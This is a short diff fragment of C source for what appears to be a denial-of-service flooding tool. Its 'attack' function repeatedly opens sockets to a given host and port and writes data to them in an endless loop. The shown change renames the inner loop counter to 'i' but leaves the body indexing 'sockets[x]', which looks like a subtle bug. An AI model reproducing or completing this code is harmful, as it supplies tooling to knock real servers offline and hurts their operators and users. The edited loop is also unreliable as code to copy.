@@ -55,12 +55,12 @@ void broke(int s) {
 
 void attack(char *host, char *port, int id) {
 	int sockets[CONNECTIONS];
-	int x, g=1, r, sock;
+	int x, g=1, r, sock, i;
 	for(x=0; x!= CONNECTIONS; x++)
 		sockets[x]=0;
 	signal(SIGPIPE, &broke);
 	while(1) {
-		for(x=0; x < PPS; x++) {
+		for(i=0; i < PPS; i++) {
 			if(sockets[x] == 0)
 				sockets[x] = make_socket(host, port);
 		        r=write(sockets[x], "\0", 1);
